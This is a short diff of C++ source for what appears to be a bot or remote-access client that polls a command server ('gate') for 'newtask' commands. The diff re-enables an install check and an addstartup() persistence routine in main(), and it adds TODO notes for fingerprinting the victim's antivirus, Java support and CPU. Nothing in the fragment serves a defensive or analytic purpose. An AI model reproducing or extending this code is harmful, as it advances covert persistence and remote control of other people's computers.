@@ -293,15 +293,14 @@ std::string encryptDecrypt(std::string toEncrypt) {
 
 //int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd){
 int main(int argc, char *argv[]) {
-
-	/*
+	
 	std::string insatlled = installedOrnot();
 	if (insatlled == "restart") {
 		std::cout << "restart program";
 		return 0;
 	}
 	addstartup();
-	*/
+	
 
 	//std::cout << encryptDecrypt(getComputerName());
 	//std::cout << encryptDecrypt(encryptDecrypt(getComputerName()));
@@ -332,8 +331,10 @@ int main(int argc, char *argv[]) {
 			std::string responseFromGate = responseToString(respons2e);
 			//TODO Handle newtask Function
 			
-
-
+			//TODO Get Current AV
+			//Java Support?
+			//32x64 Bit CPU (&& Model?)
+			//Current AV?
 
 
 			std::string substring = "newtask";
